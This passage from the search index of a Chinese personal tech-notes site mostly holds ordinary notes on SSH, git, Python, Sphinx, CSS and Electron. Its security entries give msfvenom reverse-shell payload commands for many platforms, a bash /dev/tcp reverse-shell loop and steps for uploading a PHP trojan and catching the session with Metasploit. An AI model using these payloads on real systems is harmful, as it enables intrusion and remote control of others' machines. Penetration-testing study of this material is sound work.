~/.ssh/id_rsa_remotesystem' 再次确保你已使用自己的值替换主机、主机名、端口号和 IP 地址。保存文件并退出。 然后，使用命令应用更改: $ source ~/.bashrc 或者: $ source ~/.bash_profile 在此方法中，你甚至不需要使用 ssh 别名 命令。相反，只需使用别名，如下所示。 $ webserver $ dns $ dhcp $ ubuntu （方法2太慢了 alias debian9=\"user@host\" 然后 ssh debian9 太慢了 ）","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-system-service-SSH.html","loc":"/yq-doc-source-docs-operating-system-linux-system-service-SSH.html"},{"title":"IO模型","text":"BIO 阻塞IO NIO 非阻塞IO Java有提供一个Selector的多路复用机制 Selector多路复用 不会阻塞 在Linux下, 是基于epoll实现 会维护一个epoll数组, 底层调用C的本地方法返回一个文件描述符: epoll_create(256) 其他相关可参考 /docs/后端/java/IO模型 Netty线程模型 基于NIO做了一系列封装, 性能高于 /docs/数据库/redis/redis","tags":"后端","url":"/yq-doc-source-docs-rear-end-java-IO-model.html","loc":"/yq-doc-source-docs-rear-end-java-IO-model.html"},{"title":"Sphinx简单使用","text":"创建Sphinx项目 以在当前文件夹下为例 yanque@yanquedembp new_doc_rst % sphinx-quickstart ./ 欢迎使用 Sphinx 5 .0.0 快速配置工具。 请输入接下来各项设置的值（如果方括号中指定了默认值, 直接 按回车即可使用默认值）。 已选择根路径：./ 有两种方式来设置 Sphinx 输出的创建目录： 一是在根路径下创建\"_build\"目录, 二是在根路径下创建\"source\" 和\"build\"两个独立的目录。 > 独立的源文件和构建目录（y/n） [ n ] : 项目名称将会出现在文档的许多地方。 > 项目名称: study_doc > 作者名称: yanque > 项目发行版本 [] : 0 .0.0 如果用英语以外的语言编写文档, 你可以在此按语言代码选择语种。 Sphinx 会把内置文本翻译成相应语言的版本。 支持的语言代码列表见： http://sphinx-doc.org/config.html#confval-language。 > 项目语种 [ en ] : zh_CN 创建文件 /Users/yanque/project/new_doc_rst/source/conf.py。 创建文件 /Users/yanque/project/new_doc_rst/source/index.rst。 创建文件 /Users/yanque/project/new_doc_rst/Makefile。 创建文件 /Users/yanque/project/new_doc_rst/make.bat。 完成：已创建初始目录结构。 你现在可以填写主文档文件 /Users/yanque/project/new_doc_rst/source/index.rst 并创建其他文档源文件了。 用 Makefile 构建文档, 例如： make builder 此处的\"builder\"是支持的构建器名, 比如 html、latex 或 linkcheck。 注解 注意不要使用独立的source文件夹, 不然使用toctree会存在相对路径的问题, 暂没找到解决方案. 粗略看了一下源码, make不知道怎么打断点, 看起来感觉是设计存在问题, 作罢. 配置 配置文件在 config.py , 默认的主题比较丑 使用 html_theme = 'sphinx_rtd_theme' 安装 pip install sphinx_rtd_theme 报错 Could not import extension hoverxref.extension , 安装: pip install sphinx-hoverxref Could not import extension notfound.extension : pip install sphinx-notfound-page","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-conclusion-of-issue-Sphinx-use.html","loc":"/yq-doc-source-docs-rear-end-python-conclusion-of-issue-Sphinx-use.html"},{"title":"signal","text":"官网文档:: signal 部分参考:: python进程间通信--信号Signal python的信号处理模块 信号是 Unix 系统中常见的一种进程间通信方式（IPC）, 也叫软中断信号 作用是通知进程发生了异步事件。进程之间可以调用系统来传递信号, 本身内核也可以发送信号给进程, 告诉该进程发生了某个事件. 注解 注意，信号只是用来通知某进程发生了什么事件，并不给该进程传递任何数据。 Python 信号处理程序总是会在主 Python 主解释器的主线程中执行，即使信号是在另一个线程中接收的。 这意味着信号不能被用作线程间通信的手段。 你可以改用 threading 模块中的同步原语。 此外，只有主解释器的主线程才被允许设置新的信号处理程序。 接收信号的进程对不同的信号有三种处理方法: 指定处理函数 忽略 根据系统默认值处理, 大部分信号的默认处理是终止进程 linux相关信号可见: /docs/操作系统/linux/概念性/linux系统信号 signal函数 自定义handler 用于在进程捕捉到其他进程发送的信号时调用的函数. 当此函数返回时, 进程继续按原来的逻辑顺序执行。 此函数在定义时python普通函数的定义没有区别。 函数名不一定是handler, 但作为作为参数传入signal()方法的参数名一定是与定义handler函数的函数相同: def handler(signum,frame): do something… sig: 接收到的信号编号, signal模块内部定义了一些常用的内核信号, 并为它们进行了编号。 注意: windows操作系统没有SIGUSR1和SIGUSR2这两个型号类型, linux操作系统才有 frame: 信号结构对象(可以通过结构对象查看信号信息,基本不用) signal函数实际上是一个异步的回调函数, 只要执行了该函数, 则进程任意时候接收到相应信号都会处理。 这里的异步就是上文提到的异步机制, 是计算机内核程序与本进程间同时运行, 互相不干扰的一种机制, 对于进程的正常执行有着关键的作用。 这种异步机制在任何后端编程语言中都是存在的, 只不过实现的方式和细节不一样而已。 alarm pause getsignal 信号举例 windows操作系统下, SIGNALINT编号为2: >>>signal.SIGINT <Signals.SIGINT: 2> SIGBREAK编号为21: >>>signal.SIGBREAK <Signals.SIGBREAK: 21> 常用信号类型解析: SIGHUP 断开连接 SIGINT ctrl-C SIGUIT ctrl-\\ SIGTSTP ctrl-z SIGKILL 终止进程且不能被处理 SIGSTOP 暂停进程且不能被处理 SIGALRM 时钟进程 SIGCHLD 子进程状态改变发送给父进程信息号(但一般父进程不会处理) linux系统信号可参考: /docs/操作系统/linux/概念性/linux系统信号 技巧 在系统中, SIGKILL 和 SIGSTOP 两种信号, 进程是无法捕获的. 所以对于需要人为杀死的进程, 可使用SIGTERM信号，SIGTERM表示终止信号，是kill命令传送的系统默认信号， 它与SIGKIIL的区别是，SIGTERM更为友好，进程可以捕捉SIGTERM信号，进而根据需要来做一些清理工作. 手动触发就是: kill -15 pid 警告 多线程环境下使用信号，只有 main thread 可以设置 signal 的 handler","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-signal.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-signal.html"},{"title":"架构","text":"架构图(绿色线代表数据流) 架构 Scrapy Engine(引擎) 负责Spider、ItemPipeline、Downloader、Scheduler中间的通讯，信号、数据传递等。 Scheduler(调度器) 它负责接受引擎发送过来的Request请求，并按照一定的方式进行整理排列，入队，当引擎需要时，交还给引擎。 Downloader（下载器） 负责下载Scrapy Engine(引擎)发送的所有Requests请求，并将其获取到的Responses交还给Scrapy Engine(引擎)，由引擎交给Spider来处理， Spider（爬虫） 它负责处理所有Responses,从中分析提取数据，获取Item字段需要的数据，并将需要跟进的URL提交给引擎，再次进入Scheduler(调度器). Item Pipeline(管道) 它负责处理Spider中获取到的Item，并进行进行后期处理（详细分析、过滤、存储等）的地方。 Downloader Middlewares（下载中间件） 你可以当作是一个可以自定义扩展下载功能的组件。 Spider Middlewares（Spider中间件） 你可以理解为是一个可以自定扩展和操作引擎和Spider中间通信的功能组件（比如进入Spider的Responses;和从Spider出去的Requests）","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Architecture.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Architecture.html"},{"title":"sphinx","text":"rst文档库 使用见 /docs/文档/rst标记语言/index 安装: pip install sphinx","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-sphinx.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-sphinx.html"},{"title":"一些问题/用法","text":"强制提交 强制提交, 如将本地test分支强制（-f）推送到远程主分支master 方法一: git push origin test:master -f 方法二: # 将当前分支切换到主分支 git checkout master # 将主分支重置为test分支 git reset --hard test # 将重置后的master分支强制推送到远程仓库 git push origin master -f 强制更新本地 拉取分支时强制覆盖本地 方法一: git pull -f origin $remote_branch:$local_branch 方法二: # 拉到本地库 git fetch --all # 本地库强制重制 git reset --hard $branch # 工作区更新 git pull # 合起来一行代码 # git fetch --all && git reset --hard feature-axpi-dev && git pull 更新提交信息 针对提交人以及提交邮件的修改. 执行以下代码修改相关信息: git config --global --edit 执行以下代码将修改后的内容应用到commit: git commit --amend --reset-author 注解 修改后可以通过以下命令查看: git config --list 仓库初始化说明 一般来说有两种形式 从本地开始 进入本地项目根目录 执行 git init 初始化仓库 远程新建仓库 设置远程仓库地址 git remote add origin xxx , xxx 表示仓库地址 add 后推送: git push --set-upstream origin master 从远程开始 在远程仓库如 gitee 新建仓库, 可以在此处选择性配置好一些文件 在本地仓库选择好拉取的目录, 执行 git clone xxx 永久删除文件 命令: git filter-branch --force --index-filter 'git rm -rf --cached --ignore-unmatch tagInterface/test.txt' --prune-empty --tag-name-filter cat -- --all -f ilter-branch 重写Git仓库中的提交 -r f 如果想要删除的是文件夹，将会强制并迭代查找文件夹下所有文件并删除。 --index-filter 指定一条Bash命令，然后Git会检出（checkout）所有的提交， 执行该命令，然后重新提交 --all 需要重写所有分支（或引用） 回收空间(实际这一步貌似可以不用): rm -rf .git/refs/original/ git reflog expire --expire=now --all git gc --prune=now git gc --aggressive --prune=now 最后强制push: git push -f --all 忽略已在版本控制的文件 已经将某个文件提交到Git仓库中，并且想要忽略它的修改 使用`git update-index`命令将文件标记为已忽略: git update-index --assume-unchanged <file> 如果需要查看哪些文件被标记为已忽略，可以执行如下命令: git ls-files -v | grep '&#94;h' 其中\"h\"表示文件已被标记为\"assume unchanged\"。 如果要 恢复对该文件的跟踪 ，可以使用`git update-index`命令将其取消标记: git update-index --no-assume-unchanged <file> 通过以上操作，您就可以将某个已提交的文件标记为已忽略，从而在以后的提交中忽略它的修改。 请注意，这只会在本地忽略文件的修改，而不是从版本库中删除它们。 如果您希望将已提交的文件彻底删除，请使用`git rm`命令，同时将该文件添加到`.gitignore`文件中。 详见: /docs/版本控制/git/command/update-index tag的拉取与切换 可能因为tag是静态的吧, 所以如果直接: git pull origin tag 1.0.0 这样拉取, 若于本地tag有冲突, 即使是正常迭代的版本, 也会发生merge冲突(pull默认行为) 故, 一般这样拉取: 先获取到本地版本库: git fetch origin tag 1.0.0 从本地版本tag切换: git checkout tags/1.0.0 注解 拉取时, 会覆盖本地的所有内容, 所以注意保存 全局选项 即, --global 或者 -g , 只是要注意, 当使用 -g 短选项时候, 需要将其放在末尾. 子模块报错 如果使用: git submodule update 出现报错: fatal: no submodule mapping found in .gitmodules for path . 确认 .gitmodules 文件的配置没问题的话, 多半是安装的git版本问题, 换个新一点的版本 或者支持平台的版本即可. 比如我内网机重置后安装的 git2.1 不行, 换了个 git for windows 2.3 就可以了. 网络不稳定可能导致的报错 使用VPN链接github时候, clone的时候可能会发生: error: RPC failed; curl 18 Transferred a partial file.00 KiB/s error: 2457 bytes of body are still expected fetch-pack: unexpected disconnect while reading sideband packet fatal: early EOF fatal: fetch-pack: invalid index-pack output 多半是因为VPN不稳定, 传输数据的时候节点变了, 导致数据不一致, 可以选择取消 自动选择 , 或者更换其它稳定的VPN试试. 注解 有时候及时没有使用 自动选择 , 节点也可能会不稳定, 多半是VPN提供商那边的策略有问题... 我用的是 clashX Pro 并配置了 全局配置 出现了这个问题(最开始是没有的), 然后是这链自己手机热点, 并关闭 全局配置 然后单独设置git 代理(参考 /docs/版本控制/git/command/config ): git config --global http.https://github.com.proxy http://127.0.0.1:60742 单用户配置多把id_rsa 比如给github专门配置一个密钥 按照正常流程生成密钥: $ ssh-keygen -t RSA -C \"yanquer@qq.com\" 注意命名, 我这里公私密钥分别: id_rsa_github.pub id_rsa_github 然后编辑 ~/.ssh/config : Host github.com HostName github.com User yanquer IdentityFile ~/.ssh/id_rsa_github 如果还要给gitee配置一个, 再新建个 id_rsa_gitee 的密钥后增加: Host gitee.com HostName gitee.com User yanquer IdentityFile ~/.ssh/id_rsa_gitee 完全删除子模块 从 [Git] 如何优雅的删除子模块(submodule)或修改Submodule URL <https://www.jianshu.com/p/ed0cb6c75e25> 看到的 优雅的删除子模块 # 逆初始化模块，其中{MOD_NAME}为模块目录，执行后可发现模块目录被清空 git submodule deinit { MOD_NAME } # 删除.gitmodules中记录的模块信息（--cached选项清除.git/modules中的缓存） git rm --cached { MOD_NAME } # 提交更改到代码库，可观察到'.gitmodules'内容发生变更 git commit -am \"Remove a submodule.\" 修改某模块URL 修改 .gitmodules 文件中对应模块的 url 属性; 使用 git submodule sync 命令，将新的URL更新到文件 .git/config ； thinker-g@localhost: ~/app$ git submodule sync Synchronizing submodule url for 'gitmods/thinker_g/Helpers' thinker-g@localhost: ~/app$ # 运行后可观察到'.git/config'中对应模块的url属性被更新 thinker-g@localhost: ~/app$ git commit -am \"Update submodule url.\" # 提交变更 将已在版本库的文件更为子模块 先建立好子模块仓库, 假设有一个 submodule_repo 目录需要更改为子模块 先将本地仓库初始化 cd submodule_repo git init git add . git commit -m \"first commit\" 再将远程与本地合并(这个是远程是刚建立的情况, 最多加 License, README 等与本地无关的文件) git remote add origin git@xxx.git git fetch origin # 加 --allow-unrelated-historie 允许无历史线交点合并 # 若不行则切分支合 git merge --allow-unrelated-historie origin/master 返回主仓库清除版本库内容 cd .. git rm -rf --cached submodule_repo git commit -m \"remove submodule_repo\" 将子模块加到 .gitmodules , 没有就新建: [submodule \"submodule_repo\"] path = submodule_repo url = git@xxx.git 然后更新子模块 git submodule init git submodule sync 然后 git status 就可以看到信息了, 再提交即可 git add . git commit -m \"add submodule_repo as submodule\"","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Some-problems,-usage.html","loc":"/yq-doc-source-docs-version-control-git-Some-problems,-usage.html"},{"title":"msfconsole","text":"交互式漏洞搜索工具 示例 ┌── ( yanque㉿kali ) - [ ~ ] └─$ msfconsole Call trans opt: received. 2 -19-98 13 :24:18 REC:Loc Trace program: running wake up, Neo... the matrix has you follow the white rabbit. knock, knock, Neo. ( ` . ,-, ` ` . , ; ' / `. ,' / . ' `. X /.' .- ; -- '' --.._ ` ` ( . ' / ` , ` ' Q ' , , `._ \\ ,.| ' ` -. ; _ ' : . ` ; ` ` --,.._; ' ` , ) . ' `._ , ' /_ ; , '' -, ; ' ``- ``-..__``--` https://metasploit.com =[ metasploit v6.2.26-dev ] + -- --=[ 2264 exploits - 1189 auxiliary - 404 post ] + -- --=[ 951 payloads - 45 encoders - 11 nops ] + -- --=[ 9 evasion ] Metasploit tip: After running db_nmap, be sure to check out the result of hosts and services Metasploit Documentation: https://docs.metasploit.com/ msf6 > searchsploit ubuntu 16.04 [*] exec: searchsploit ubuntu 16.04 ---------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------- --------------------------------- Apport 2.x (Ubuntu Desktop 12.10 < 16.04) - L | linux/local/40937.txt Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Priv | linux/local/40054.c Google Chrome (Fedora 25 / Ubuntu 16.04) - ' t | linux/local/40943.txt LightDM ( Ubuntu 16 .04/16.10 ) - 'Guest Account | linux/local/41923.txt Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14. | linux_x86-64/local/42275.c Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16 | linux_x86/local/42276.c Linux Kernel (Ubuntu 16.04) - Reference Count | linux/dos/39773.txt Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) | linux/local/45175.c Linux Kernel 4.4 (Ubuntu 16.04) - ' BPF ' Local | linux/local/40759.rb Linux Kernel 4.4 (Ubuntu 16.04) - ' snd_timer_ | linux/dos/46529.c Linux Kernel 4 .4.0 ( Ubuntu 14 .04/16.04 x86-64 | linux_x86-64/local/40871.c Linux Kernel 4 .4.0-21 ( Ubuntu 16 .04 x64 ) - Ne | linux_x86-64/local/40049.c Linux Kernel 4 .4.0-21 < 4 .4.0-51 ( Ubuntu 14 .0 | windows_x86-64/local/47170.c Linux Kernel 4 .4.x ( Ubuntu 16 .04 ) - 'double-f | linux/local/39772.txt Linux Kernel 4.6.2 (Ubuntu 16.04.1) - ' IP6T_S | linux/local/40489.txt Linux Kernel 4 .8 ( Ubuntu 16 .04 ) - Leak sctp K | linux/dos/45919.c Linux Kernel < 4 .13.9 ( Ubuntu 16 .04 / Fedora | linux/local/45010.c Linux Kernel < 4 .4.0-116 ( Ubuntu 16 .04.4 ) - L | linux/local/44298.c Linux Kernel < 4 .4.0-21 ( Ubuntu 16 .04 x64 ) - | linux_x86-64/local/44300.c Linux Kernel < 4 .4.0-83 / < 4 .8.0-58 ( Ubuntu | linux/local/43418.c Linux Kernel < 4 .4.0/ < 4 .8.0 ( Ubuntu 14 .04/1 | linux/local/47169.c ---------------------------------------------- --------------------------------- Shellcodes: No Results msf6 > # 生成木马文件 msfvenom -p php/meterpreter/reverse_tcp lhost = 192 .168.142.132 lport = 7777 -o shell.php # 将木马文件通过漏洞上传到服务器, 然后触发访问 # 打开交互式msfconsole工具做好监听 msfconsole use exploit/multi/handler set payload php/meterpreter/reverse_tcp set lhost 192 .168.142.132 set lport 7777 exploit lhost 自己机器的ip 详情见: ../msf/index","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-msfconsole.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-msfconsole.html"},{"title":"MSF生成各种Payload","text":"Windows msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -e x86/shikata_ga_nai -b '\\x00\\x0a\\xff' -i 3 -f exe -o payload.exe Linux msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -f elf -o payload.elf MAC OS msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -f macho -o payload.macho Android msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -f apk -o payload.apk PowerShell msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1 PHP msfvenom -p php/meterpreter_reverse_tcp LHOST = <Your IP Address> LPORT = <Your Port to Connect On> -f raw > shell.php cat shell.php | pbcopy && echo '<?php ' | tr -d '\\n' > shell.php && pbpaste >>shell.php ASP.net msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -f aspx -o payload.aspx JSP msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -f raw -o payload.jsp War msfvenom -p java/jsp_shell_reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -f raw -o payload.war Node.js msfvenom -p nodejs/shell_reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -f raw -o payload.js Python msfvenom -p python/meterpreter/reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -f raw -o payload.py # msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.179.129 LPORT=58765 -f raw -o payload.py Perl msfvenom -p cmd/unix/reverse_perl LHOST = 攻击机IP LPORT = 攻击机端口 -f raw -o payload.pl Ruby msfvenom -p ruby/shell_reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -f raw -o payload.rb Lua msfvenom -p cmd/unix/reverse_lua LHOST = 攻击机IP LPORT = 攻击机端口 -f raw -o payload.lua Windows ShellCode msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -f c linux shellcode msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -f c mac shellcode msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -f c Bash shellcode [ root@localhost ~ ] # msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.30 LPORT=8888 > -f raw > payload.sh [ root@localhost ~ ] # exec 5<>/dev/tcp/xx.xx.xx.xx/xx [ root@localhost ~ ] # cat <&5 | while read line; do $line 2>&5 >&5; done Python shellcode msf5 > use exploit/multi/script/web_delivery msf5 exploit ( multi/script/web_delivery ) > set payload python/meterpreter/reverse_tcp msf5 exploit ( multi/script/web_delivery ) > set srvhost 192 .168.179.129 srvhost = > 192 .168.1.30 msf5 exploit ( multi/script/web_delivery ) > set lhost 192 .168.179.129 lhost = > 192 .168.1.30 msf5 exploit ( multi/script/web_delivery ) > set lport 58765 msf5 exploit ( multi/script/web_delivery ) > set uripath lyshark uripath = > lyshark msf5 exploit ( multi/script/web_delivery ) > exploit -j -z","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-MSF-MSF-generates-various-payload.html","loc":"/yq-doc-source-docs-Safety-kali-MSF-MSF-generates-various-payload.html"},{"title":"msfvenom","text":"生成 payload 注解 venom (毒液) 可参考 ../msf/MSF生成各种Payload","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-MSF-msfvenom.html","loc":"/yq-doc-source-docs-Safety-kali-MSF-msfvenom.html"},{"title":"问题","text":"","tags":"文档","url":"/yq-doc-source-docs-document-question-index.html","loc":"/yq-doc-source-docs-document-question-index.html"},{"title":"CSS伪类","text":"常见的 :active 元素激活. 比如按钮被点击, input选中 :hover 鼠标移入元素. 或者说当鼠标悬停在元素上时应用的样式 :before 在元素渲染之前增加内容 :after 在元素渲染之后增加内容 :focus 当元素获得焦点（例如通过键盘导航）时应用的样式。 :visited 表示已访问过的链接的样式。 :link 表示未访问的链接的样式。 :first-child 选择作为其父元素的第一个子元素的元素。 :last-child 选择作为其父元素的最后一个子元素的元素。 :nth-child(n) 选择作为其父元素的第 n 个子元素的元素。其中 n 可以是一个具体的数字、关键字（如 even、odd）或表达式（如 2n+1）。 :nth-of-type(n) 选择作为其父元素中特定类型的第 n 个子元素的元素。 :nth-last-child(n) 选择作为其父元素的倒数第 n 个子元素的元素。 :nth-last-of-type(n) 选择作为其父元素中特定类型的倒数第 n 个子元素的元素。 :disabled 匹配被禁用的元素，例如 <input>、<button> 等。可以用于样式化禁用状态下的元素。 :enabled 匹配启用的元素，与 :disabled 相反。可以用于样式化启用状态下的元素。 :not() 表示对某一种选择器取反, 如选择未被禁用的button: button:not(:disabled) 现有css类属性a,b,c; a下包含b和c, b下包含c 如何写css选择器, 选择 a下的 不属于b 的c: .a .c:not(.b .c)","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-Pseudo--category.html","loc":"/yq-doc-source-docs-front-end-CSS-Pseudo--category.html"},{"title":"异常","text":"在 TypeScript 中，没有像 Python 中的 ValueError 这样的内置异常类型。 不过，你可以自定义异常类来表示特定的错误情况。 示例，在 TypeScript 中自定义异常类: class ValueError extends Error { constructor(message: string) { super(message); this.name = \"ValueError\"; } } function divide(a: number, b: number): number { if (b === 0) { throw new ValueError(\"除数不能为零！\"); } return a / b; } try { const result = divide(10, 0); console.log(result); } catch (error) { if (error instanceof ValueError) { console.error(\"发生值错误：\", error.message); } else { console.error(\"发生错误：\", error.message); } } 在 divide 函数中，我们使用 throw 关键字抛出一个 ValueError 异常，提供了相应的错误消息。 在 try 块中，我们调用 divide 函数，并根据异常对象的类型进行适当的处理。 如果捕获到的异常是 ValueError 类型的，我们打印出值错误的消息，否则打印一般错误的消息。 注解 使用 throw 抛出异常","tags":"前端","url":"/yq-doc-source-docs-front-end-Conceptual-abnormal.html","loc":"/yq-doc-source-docs-front-end-Conceptual-abnormal.html"},{"title":"electron-builder配置生成位置","text":"在 package.json 的 build 位置: \"build\": { // electron-builder的配置 \"productName\":\"xxxx\", // 项目名 这也是生成的exe文件的前缀名 \"appId\": \"com.xxx.xxxxx\", // 包名 \"copyright\":\"xxxx\", // 版权 信息 \"directories\": { \"output\": \"build\" // 输出文件夹, 只能配置输出的上面几层, // 比如mac下默认输出位置是 dist/mac, // 在这里配置了output 为 dist/myapp, // 最终输出位置还是有mac, 会变成 dist/myapp/mac // 坑的一批 }, // windows相关的配置 \"win\": { \"icon\": \"xxx/icon.ico\"// 图标路径 } } 部分参考: https://segmentfault.com/a/1190000017296201","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-Electron-Electron-Builder-configuration.html","loc":"/yq-doc-source-docs-front-end-frame-Electron-Electron-Builder-configuration.html"},{"title":"electron生命周期","text":"退出的两个调用: app.quit(): 尝试关闭所有窗口(如果窗口有 window.on('close', (e) => e.preventDefault()) 则失败) - 首先发出 before-quit 事件，如果所有窗口关闭成功，则发出 will-quit 事件，然后 app 退出 - 此方法会确保执行所有的 beforeunload 和 unload（dom）事件，当然可以在 beforeunload 事件中返回 false 阻止继续退出。 app.exit([code]): 使用 exitCode 立即退出。exitCode 默认为0 - 所有窗口立即关闭，而不询问用户，且不触发 beforeunload 和 unload 事件","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-Electron-Electron-life-cycle.html","loc":"/yq-doc-source-docs-front-end-frame-Electron-Electron-life-cycle.html"},{"title":"webstrom中如何进行调试","text":"主要针对ts项目 因为ts需要编译成js使用, 所以断点需要打在编译后的js文件内 命令行触发浏览器调试 有个 electron 有个内置的开启debug, 直接命令触发: ./node_modules/.bin/electron . --inspect 其中 --inspect 可以跟端口(默认9229): --inspect=8888 启动后, 在 Chrome 浏览器（或其他基于 Chromium 开发的浏览器） 中打开 chrome://inspect 即可看到对应的调试会话 webstrom开启调试 如下配置 其中参数 out/main.js 是编译好的入口文件. 注意解释器需要选 electron 的路径 这时候把断点打在相应的js文件并点击小虫子即可开启调试 若需要直接上面的在浏览器中调试, 增加参数即可: --remote-debugging-port=9222 注解 直接点击 package.json 启动是无法进行调试的.","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-Electron-How-to-debug-in-webstorm.html","loc":"/yq-doc-source-docs-front-end-frame-Electron-How-to-debug-in-webstorm.html"},{"title":"一些遇到过的报错","text":"报错内容: error /Users/yanque/project/webstorm/electron-study/node_modules/electron: Command failed. Exit code: 1 Command: node install.js Arguments: Directory: project/webstorm/electron-study/node_modules/electron Output: ReadError: The server aborted pending request 原因: electron 下载不会使用本地配置的 registry 镜像, 需要额外配置 electron_mirror : yarn config set electron_mirror https://npm.taobao.org/mirrors/electron/","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-Electron-Install-error.html","loc":"/yq-doc-source-docs-front-end-frame-Electron-Install-error.html"},{"title":"一些问题","text":"preload无法导入其他ts BrowserWindow加载参数webPreferences.preload, 当preload调用了node的api时, 需要将 nodeIntegration 设置为 true: const mainWindow = new BrowserWindow({ width: 800, height: 600, webPreferences: { // 集成nodejs, preload脚本中使用了Node.js的API时必设为true, 才能正常执行 nodeIntegration: true, preload: join(__dirname, 'preload.js') } })","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-Electron-some-problems.html","loc":"/yq-doc-source-docs-front-end-frame-Electron-some-problems.html"},{"title":"api配置-数据加载/刷新","text":"amis有数据域的概念, 数据域也可以从api加载. 普通的 ajax 请求 格式: [<method>:]<url> method：get、post、put、delete，默认为 get url：接口地址，即模板字符串 如: { \"api\": \"get:/amis/api/initData\", // get 请求 \"api\": \"post:/amis/api/initData\", // post 请求 \"api\": \"put:/amis/api/initData\", // put 请求 \"api\": \"delete:/amis/api/initData\" // delete 请求 } 注意接口返回格式: { \"status\": 0, \"msg\": \"\", \"data\": { ...其他字段 } } status: 返回 0，表示当前接口正确返回，否则按错误请求处理； msg: 返回接口处理信息，主要用于表单提交或请求失败时的 toast 显示； data: 必须返回一个具有 key-value 结构的对象。 注解 api默认发送当前数据域的数据, 可以在当前元素手动配置 data 来自定义发送的数据 预加载数据 使用 initApi , 基本可用于所有组件 注解 实际使用的时候遇到一个问题, 写在 form 的上一层 dialog 组件, 没有生效, 换到 form 组件, 就可以了, 不知是为何","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-amis-API-configuration.html","loc":"/yq-doc-source-docs-front-end-frame-amis-API-configuration.html"},{"title":"表达式语法","text":"JS对象与字符串转换 ENCODEJSON 将JS对象转换为字符串, 例: data: { envStr: '${ENCODEJSON(envObj)}', }, DECODEJSON 将字符串转换为JS对象, 例: data: { envObj: '${DECODEJSON(envStr)}', },","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-amis-Expression-grammar.html","loc":"/yq-doc-source-docs-front-end-frame-amis-Expression-grammar.html"},{"title":"表单校验","text":"用法 validations 配置校验规则, 尽量使用JSON格式而不推荐字符串, 如: { \"type\": \"input-text\", \"label\": \"文本\", \"name\": \"text\", \"validations\": { \"isNumeric\": true }, \"description\": \"请输入数字类型文本\" } 支持的校验 参考: https://aisuda.bce.baidu.com/amis/zh-CN/components/form/formitem#自定义校验信息 isNumeric 是否是数字 完整: { isEmail: 'validate.isEmail', isRequired: 'validate.isRequired', isUrl: 'validate.isUrl', isInt: 'validate.isInt', isAlpha: 'validate.isAlpha', isNumeric: 'validate.isNumeric', isAlphanumeric: 'validate.isAlphanumeric', isFloat: 'validate.isFloat', isWords: 'validate.isWords', isUrlPath: 'validate.isUrlPath', matchRegexp: 'validate.matchRegexp', minLength: 'validate.minLength', maxLength: 'validate.maxLength', maximum: 'validate.maximum', lt: 'validate.lt', minimum: 'validate.minimum', gt: 'validate.gt', isJson: 'validate.isJson', isLength: 'validate.isLength', notEmptyString: 'validate.notEmptyString', equalsField: 'validate.equalsField', equals: 'validate.equals', isPhoneNumber: 'validate.isPhoneNumber', isTelNumber: 'validate.isTelNumber', isZipcode: 'validate.isZipcode', isId: 'validate.isId', /* 日期时间相关校验规则 2.2.0 及以上版本生效 */ isDateTimeSame: 'validate.isDateTimeSame', isDateTimeBefore: 'validate.isDateTimeBefore', isDateTimeAfter: 'validate.isDateTimeAfter', isDateTimeSameOrBefore: 'validate.isDateTimeSameOrBefore', isDateTimeSameOrAfter: 'validate.isDateTimeSameOrAfter', isDateTimeBetween: 'validate.isDateTimeBetween', isTimeSame: 'validate.isTimeSame', isTimeBefore: 'validate.isTimeBefore', isTimeAfter: 'validate.isTimeAfter', isTimeSameOrBefore: 'validate.isTimeSameOrBefore', isTimeSameOrAfter: 'validate.isTimeSameOrAfter', isTimeBetween: 'validate.isTimeBetween', isVariableName: 